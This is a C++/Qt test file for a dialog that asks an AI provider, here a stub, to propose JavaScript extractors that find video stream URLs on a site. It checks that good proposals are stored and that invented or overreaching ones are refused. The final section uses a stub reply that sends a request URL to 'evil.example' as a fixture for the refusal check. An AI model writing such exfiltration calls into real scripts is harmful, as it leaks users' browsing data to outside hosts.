// The review loop end to end, with a stub provider standing in for a model.
// What a real model returns is unmeasured; what the dialog does with a reply
// is not.
#include "extractor_dialog.h"
#include "extractor_signals.h"
#include "extractor_helpers.h"
#include "site_extractor.h"
#include "ai_provider.h"

#include <QApplication>
#include <QEventLoop>
#include <QPlainTextEdit>
#include <QHostAddress>
#include <QLabel>
#include <QPushButton>
#include <QTcpServer>
#include <QTcpSocket>
#include <QTimer>
#include <QThread>
#include <QElapsedTimer>
#include <functional>
#include <cstdio>

static int g_pass = 0, g_fail = 0;
static void check(bool ok, const QString &w) {
	if (ok) { ++g_pass; std::printf("  ok    %s\n", qPrintable(w)); }
	else    { ++g_fail; std::printf("  FAIL  %s\n", qPrintable(w)); }
}
static void section(const char *n) { std::printf("\n== %s ==\n", n); }
static void spin(int ms) { QEventLoop l; QTimer::singleShot(ms, &l, &QEventLoop::quit); l.exec(); }

// Wait for the thing that has to happen, not for a number of milliseconds.
//
// This suite used to click a button and then `spin(400)`, `spin(600)`,
// `spin(800)` before asserting on the result. That is a bet that judging beats
// the clock, and on a loaded machine it sometimes did not -- a whole section
// would fail together because the verdict had not arrived yet, which is the
// shape of the intermittent failures recorded in project.md. A generous deadline
// with an early exit costs nothing when things are fast and cannot lie in that
// direction when they are slow.
//
// The same lesson the subframe tap taught, in the same file it was written down
// in: a fixed wait is an instrument that invents results.
static bool wait_for(const std::function<bool()> &done, int max_ms = 10000) {
	QElapsedTimer t;
	t.start();
	while (!done() && t.elapsed() < max_ms)
		spin(20);
	return done();
}

// The dialog is ready to be driven when its Send button is offered.
//
// **This is a wait, not a delay, and that distinction cost three days of
// intermittent failures.** The dialog asks the server what its candidate
// addresses serve *when it opens*, and keeps Send disabled until those answers
// are in. The sections below used to `spin(200)` and then assert Send was
// enabled -- a bet that six DNS lookups for hosts that do not exist would all
// fail inside a fifth of a second. They usually do. On a loaded machine they do
// not, and then a whole section fails together with "Send is offered when there
// is evidence" at the top of it, which reads like a broken dialog rather than a
// harness that did not wait.
//
// It went unexplained twice because the failure only appears on the first
// `make test` after a rebuild -- which looked like a build problem and is
// nothing of the sort. That is simply the moment the machine is busiest.
static bool send_ready(QWidget *dlg) {
	for (QPushButton *b : dlg->findChildren<QPushButton *>())
		if (b->text().contains("Send"))
			return b->isEnabled();
	return false;
}

// Judging is finished when the dialog has a verdict to show.
static bool judged(QWidget *dlg) {
	auto *v = dlg->findChild<QLabel *>("verdict");
	return v && !v->text().isEmpty();
}

// Answers with whatever it was told to, on the next turn of the event loop.
class stub_provider : public ai_provider {
	Q_OBJECT
public:
	QString reply;
	bool external = false;
	QString name() const override { return "Stub"; }
	bool available() const override { return true; }
	bool is_external() const override { return external; }
	void send(const QString &, const QString &user) override {
		last_payload = user;
		QTimer::singleShot(0, this, [this] { emit finished(reply); });
	}
	QString last_payload;
};

// A stream the way the measured site serves one: a playlist wearing `.txt` and
// the parts it names wearing web-font extensions. Loopback, because the point is
// to drive the dialog's own probing rather than to reach anything real.
class fake_cdn : public QTcpServer {
public:
	void incomingConnection(qintptr fd) override {
		auto *s = new QTcpSocket(this);
		s->setSocketDescriptor(fd);
		connect(s, &QTcpSocket::readyRead, this, [s] {
			const QByteArray head = s->readAll();
			const QByteArray path = head.mid(4, head.indexOf(' ', 4) - 4);

			QByteArray type, body;
			if (path.contains("cf-master")) {
				type = "text/plain; charset=utf-8";
				body = "#EXTM3U\n#EXT-X-VERSION:3\n"
				        "#EXT-X-STREAM-INF:BANDWIDTH=800000\nindex-f1-v1-a1.txt\n";
			} else if (path.contains("init-") || path.contains("seg-")) {
				// Really is a stream body, which is what makes this the hard case:
				// fetching the init segment agrees that it is one.
				type = "font/woff2";
				body = QByteArray("\0\0\0\x18", 4) + "ftypiso5" + QByteArray(16, '\0');
			} else {
				type = "text/html";
				body = "<!doctype html><html>furniture</html>";
			}

			QByteArray resp = "HTTP/1.1 200 OK\r\nContent-Type: " + type +
			                   "\r\nContent-Length: " + QByteArray::number(body.size()) +
			                   "\r\nConnection: close\r\n\r\n" + body;
			s->write(resp);
			s->flush();
			s->disconnectFromHost();
		});
	}
};

static QPushButton *button(QWidget *w, const QString &text) {
	for (QPushButton *b : w->findChildren<QPushButton *>())
		if (b->text().contains(text))
			return b;
	return nullptr;
}

int main(int argc, char **argv) {
	std::setvbuf(stdout, nullptr, _IONBF, 0);
	QApplication app(argc, argv);

	const QUrl page("https://site.example/watch/1");
	extractor_signals sig;
	// Feed it the way the interceptor would.
	auto feed = [&](const char *u, resource_kind k) {
		request_context c;
		c.url = QUrl(QString::fromUtf8(u));
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = k;
		sig.on_request(c, request_decision{});
	};
	feed("https://site.example/watch/1", resource_kind::other);
	feed("https://site.example/app.js", resource_kind::script);
	feed("https://p.example/db/abc/cf-master.1774687168.txt?k=UCp", resource_kind::other);
	for (int i = 0; i < 40; ++i)
		feed(QString("https://p.example/db/abc/seg-%1.ts").arg(i, 5, 10, QChar('0'))
		         .toUtf8().constData(), resource_kind::other);

	check(sig.count_for("site.example") == 43,
	      QString("evidence collected (%1)").arg(sig.count_for("site.example")));

	section("a good proposal is accepted and stored");
	{
		extractor_store store;
		stub_provider prov;
		prov.reply = "```javascript\n"
		             "extract = function (page, requests) {\n"
		             "  for (var i = 0; i < requests.length; i++)\n"
		             "    if (requests[i].url.indexOf('cf-master') !== -1)\n"
		             "      return { url: requests[i].url, kind: 'hls',\n"
		             "               headers: { Referer: page.url } };\n"
		             "  return null;\n"
		             "};\n"
		             "```";
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.show();
		wait_for([&] { return send_ready(&dlg); });

		QPushButton *send  = button(&dlg, "Send");
		QPushButton *apply = button(&dlg, "Use This");
		check(send && send->isEnabled(), "Send is offered when there is evidence");
		check(apply && !apply->isEnabled(), "and nothing can be accepted yet");

		send->click();
		wait_for([&] { return judged(&dlg); });

		check(!prov.last_payload.isEmpty(), "the payload was sent");
		check(prov.last_payload.contains("cf-master"),
		      "and contains the request that matters");
		// The flood is a count in the `seen` column now. It used to be a
		// "(+N more like this)" suffix printed after the url, which is the same
		// mistake the served-type note made: anything trailing an address can
		// be read as part of it.
		int most = 0;
		for (const QString &row : prov.last_payload.split('\n')) {
			const QStringList cols = row.split(" | ");
			if (cols.size() >= 4)
				most = qMax(most, cols[2].trimmed().toInt());
		}
		check(most > 1,
		      QString("with the segment flood folded rather than sent whole (%1)")
		          .arg(most));
		check(apply->isEnabled(), "a valid proposal becomes acceptable");

		apply->click();
		wait_for([&] { return store.has("site.example"); });
		check(store.has("site.example"), "accepting stores it for the host");
		check(store.source_for("site.example").contains("cf-master"),
		      "with the script itself");
		check(!store.source_for("site.example").startsWith("```"),
		      "and the markdown fence stripped");
	}

	section("a proposal that invents a URL cannot be accepted");
	{
		extractor_store store;
		stub_provider prov;
		prov.reply = "extract = function(){ return "
		             "{ url: 'https://elsewhere.example/x.m3u8', kind: 'hls' }; };";
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.show();
		wait_for([&] { return send_ready(&dlg); });
		button(&dlg, "Send")->click();
		wait_for([&] { return judged(&dlg); });

		QPushButton *apply = button(&dlg, "Use This");
		check(apply && !apply->isEnabled(),
		      "the accept button stays disabled");
		check(!store.has("site.example"), "and nothing is stored");
	}

	section("a piece of the stream cannot be accepted, through the real dialog");
	{
		// The gate rule has its own checks; this is the wiring above it, which is
		// where this project's defects actually live. The dialog probes on open,
		// keeps what came back, and hands it to the judge on another thread -- a
		// chain where any link can be right and the path still dead.
		fake_cdn cdn;
		if (!cdn.listen(QHostAddress::LocalHost, 0)) {
			check(false, "could not listen");
		} else {
			const QString base =
			QString("http://127.0.0.1:%1/v4/db/abc/").arg(cdn.serverPort());
			const QUrl cdn_page("https://site.example/watch/9");

			extractor_signals ev;
			auto add = [&](const QString &u) {
				request_context c;
				c.url = QUrl(u);
				c.site_host = "site.example";
				c.request_host = c.url.host();
				c.kind = resource_kind::other;
				ev.on_request(c, request_decision{});
			};
			add(cdn_page.toString());
			add(base + "cf-master.1774687168.txt?k=UCp");
			add(base + "init-f1-v1-a1.woff?k=UCp");
			// Two only: three of a shape is a flood and the segment rule would refuse
			// the init segment's neighbours for reasons that are not this rule's.
			add(base + "seg-1-f1-v1-a1.woff2?k=UCp");
			add(base + "seg-2-f1-v1-a1.woff2?k=UCp");

			extractor_store store;
			stub_provider prov;
			prov.reply = "extract = function (page, requests) {\n"
			            "  for (var i = 0; i < requests.length; i++)\n"
			            "    if (requests[i].url.indexOf('init-') !== -1)\n"
			            "      return { url: requests[i].url, kind: 'direct' };\n"
			            "  return null;\n"
			            "};";
			extractor_dialog dlg(&ev, &store, &prov, "site.example", cdn_page);
			dlg.show();

			QPushButton *send = button(&dlg, "Send");
			QElapsedTimer waited;
			waited.start();
			while (send && !send->isEnabled() && waited.elapsed() < 15000)
				spin(50);
			check(send && send->isEnabled(), "the probes finish and Send is offered");

			QPlainTextEdit *payload = dlg.findChild<QPlainTextEdit *>("payload");
			check(payload && payload->toPlainText().contains("HLS"),
			    "the playlist was identified despite its .txt extension");

			send->click();
			wait_for([&] { return judged(&dlg); });

			QPushButton *apply = button(&dlg, "Use This");
			check(apply && !apply->isEnabled(),
			    "a proposal returning the init segment cannot be accepted");
			QLabel *verdict = dlg.findChild<QLabel *>("verdict");
			check(verdict && verdict->text().contains("cf-master"),
			    "and the reason points at the playlist instead");

			// The same dialog, the same probes, the answer that is right: this must
			// not have become a rule that refuses everything on a stream host.
			prov.reply = "extract = function (page, requests) {\n"
			            "  for (var i = 0; i < requests.length; i++)\n"
			            "    if (requests[i].url.indexOf('cf-master') !== -1)\n"
			            "      return { url: requests[i].url, kind: 'hls' };\n"
			            "  return null;\n"
			            "};";
			send->click();
			wait_for([&] { return apply && apply->isEnabled(); });
			check(apply && apply->isEnabled(), "while the playlist itself is accepted");
		}
	}

	section("a stored extractor keeps being judged");
	{
		extractor_store store;
		store.set_for("site.example",
		               "extract = function(p, r){ for (var i=0;i<r.length;i++) "
		               "if (r[i].url.indexOf('cf-master')!==-1) "
		               "return { url: r[i].url, kind: 'hls' }; return null; };",
		               "");
		const extractor_verdict v = site_extractor::check(
		  store.source_for("site.example"), page, sig.evidence_for("site.example"));
		check(v.usable, "it still matches this page");

		// A site that changed shape: the same script, evidence without it.
		extractor_signals other;
		request_context c;
		c.url = QUrl("https://site.example/watch/2");
		c.site_host = "site.example";
		c.kind = resource_kind::other;
		other.on_request(c, request_decision{});
		const extractor_verdict stale = site_extractor::check(
		  store.source_for("site.example"), page, other.evidence_for("site.example"));
		check(!stale.usable,
		      "and stops producing a result when the site changes, rather than "
		      "producing a wrong one");
	}

	section("the transcript is what the user is shown");
	{
		// Driven through the real dialog, because this project's defects have
		// overwhelmingly been in wiring: a transcript that is correct and never
		// displayed is the exact failure mode to guard against here.
		extractor_signals sig;
		auto feed = [&](const char *u) {
			request_context c;
			c.url = QUrl(QString::fromUtf8(u));
			c.site_host = "site.example";
			c.request_host = c.url.host();
			c.kind = resource_kind::other;
			sig.on_request(c, request_decision{});
		};
		feed("https://site.example/watch/1");
		feed("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp");

		auto fake = [](const QUrl &u, qint64, int) -> fetch_result {
			fetch_result r;
			r.reached = true;
			r.status = 200;
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = u.toString().contains("cf-master")
			  ? QByteArray("#EXTM3U\nindex-f1.txt?k=UCp\n")
			  : QByteArray("#EXTM3U\n#EXT-X-ENDLIST\n");
			return r;
		};

		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, fake, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
		  "extract = function (page, requests) {"
		  "  for (var i = 0; i < requests.length; i++) {"
		  "    var u = requests[i].url;"
		  "    if (u.indexOf('cf-master') === -1) continue;"
		  "    hydra.head(u);"
		  "    var body = hydra.text(u);"
		  "    hydra.log('found ' + body.length + ' bytes of playlist');"
		  "    return { url: u, kind: 'hls', headers: { Referer: page.url } };"
		  "  }"
		  "  return null;"
		  "};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		spin(200);

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		auto *proposal   = dlg.findChild<QPlainTextEdit *>("proposal");
		check(transcript && proposal, "the panes are findable by name, not position");
		check(transcript && !transcript->isVisible(),
		      "and the transcript is hidden before anything has been done");

		button(&dlg, "Send")->click();
		wait_for([&] { return transcript && transcript->isVisible(); });

		check(transcript && transcript->isVisible(),
		      "after a helper-tier run it is shown");
		const QString shown = transcript ? transcript->toPlainText() : QString();
		check(shown.contains("head") && shown.contains("text") &&
		          shown.contains("log"),
		      "with every call the script made");
		check(shown.contains("mpegurl"),
		      "saying what the server actually answered");
		check(shown.contains("found") && shown.contains("bytes of playlist"),
		      "and the script's own note alongside");
		check(!shown.startsWith("!"), "nothing is marked as refused here");
	}

	section("a slow script does not freeze the window");
	{
		// The property, stated as an ordering rather than a feeling: a timer on
		// this thread must fire *before* the verdict arrives. If judging ran
		// here, the timer would be stuck behind it and could only fire after.
		extractor_signals sig;
		request_context c;
		c.url = QUrl("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp");
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = resource_kind::other;
		sig.on_request(c, request_decision{});

		auto slow = [](const QUrl &, qint64, int) -> fetch_result {
			QThread::msleep(400);            // a CDN that takes its time
			fetch_result r;
			r.reached = true; r.status = 200;
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = "#EXTM3U\n#EXT-X-ENDLIST\n";
			return r;
		};
		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, slow, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
		  "extract = function (page, requests) {"
		  "  hydra.text(requests[0].url);"
		  "  return { url: requests[0].url, kind: 'hls' };"
		  "};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		spin(150);

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		qint64 ticked = -1, judged = -1;
		QElapsedTimer clock;
		clock.start();
		QTimer::singleShot(120, [&] { ticked = clock.elapsed(); });

		button(&dlg, "Send")->click();
		while (clock.elapsed() < 6000 && judged < 0) {
			QCoreApplication::processEvents(QEventLoop::AllEvents, 10);
			if (transcript && transcript->isVisible())
				judged = clock.elapsed();
		}

		check(judged >= 400,
		      QString("the script really did block on a slow fetch (%1 ms)")
		          .arg(judged));
		check(ticked >= 0, "a timer on this thread still fired");
		check(ticked >= 0 && judged >= 0 && ticked < judged,
		      QString("and it fired while the script was running, not after "
		               "(%1 ms vs %2 ms)").arg(ticked).arg(judged));
	}

	section("a script that overreaches shows why, and is refused");
	{
		extractor_signals sig;
		request_context c;
		c.url = QUrl("https://site.example/watch/1");
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = resource_kind::other;
		sig.on_request(c, request_decision{});

		auto fake = [](const QUrl &, qint64, int) -> fetch_result {
			fetch_result r;
			r.reached = true; r.status = 200;
			r.content_type = "text/plain"; r.body = "x";
			return r;
		};
		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, fake, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
		  "extract = function (page, requests) {"
		  "  hydra.text('https://evil.example/?d=' + requests[0].url);"
		  "  return { url: requests[0].url, kind: 'direct' };"
		  "};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		wait_for([&] { return send_ready(&dlg); });
		button(&dlg, "Send")->click();
		wait_for([&] { return judged(&dlg); });

		QPushButton *apply = button(&dlg, "Use This");
		check(apply && !apply->isEnabled(), "it cannot be accepted");

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		const QString shown = transcript ? transcript->toPlainText() : QString();
		check(transcript && transcript->isVisible(),
		      "and the transcript is shown on rejection too — this is the case "
		      "where it matters most");
		check(shown.contains("!"),
		      "with the refused call marked in the margin, not merely worded");
		check(shown.contains("evil.example"),
		      "naming the address it tried to reach");
		check(store.source_for("site.example").isEmpty(), "and nothing is stored");
	}

	std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
	return g_fail == 0 ? 0 : 1;
}
#include "test_extloop.moc"
